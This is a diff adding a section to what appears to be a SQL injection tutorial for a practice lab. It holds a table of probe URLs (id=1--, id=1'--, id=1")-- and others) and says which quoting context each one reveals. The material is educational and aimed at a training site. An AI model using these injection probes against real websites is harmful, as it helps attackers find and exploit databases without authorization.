@@ -42,6 +42,23 @@ select * from table_name where id=("23")
 
 ```
 
+You need realize several tests, really this is tense but is necessary
+
+```
++----------------------------------------------------------------+------------------------------------------------------------------------------+
+|                     Injection                                  |             If it gives same Output as 23 was giving then                    |
++----------------------------------------------------------------+------------------------------------------------------------------------------+
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1--     | Its intiger type injection and `--` can be used as comment                   |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'--    | Its Single quote type injection and '--' can be used as comment              | 
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"--    | Its Double quote type injection and '--' can be used as comment              |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1)--    | Its intiger type with bracket injection and '--' can be used as comment      |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')--   | Its Single quote with bracket type injection and '--' can be used as comment |
+|http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1")--   | Its Double quote with bracket type injection and '--' can be used as comment |
++----------------------------------------------------------------+------------------------------------------------------------------------------+
+
+```
+
+
 #### Information IMPORTANT
 Remember whenever the input is enclosed with single quotes only single quote with input will create error.
 When input is enlcosed by double quotes a double qoute with input will give error.
